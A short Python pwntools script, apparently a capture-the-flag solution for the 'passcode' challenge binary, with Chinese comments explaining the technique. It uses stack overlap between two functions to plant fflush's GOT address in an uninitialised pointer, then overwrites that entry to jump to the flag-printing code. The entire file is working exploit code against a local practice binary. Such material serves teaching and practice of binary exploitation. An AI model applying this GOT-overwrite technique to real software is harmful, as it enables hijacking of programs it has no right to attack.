#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
# 连续调用welcome和login函数，两个函数有相同的栈底，部分变量处于相同的物理位置
# 通过welcome函数中输入，为login中野指针passcode1赋初值，进而改写fflush_got，调用程序中打印flag的语句
from pwn import *
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = process('./passcode')
# gdb.attach(io, 'b * 0x80486d7')
elf = ELF('./passcode')
call_sys = 0x8048663
io.recvline()
payload = 'a' * 96 + p32(elf.got['fflush'])
io.sendline(payload)
# now the passcode1 point to fflush got
io.sendline(str(call_sys))

io.interactive()
io.close()
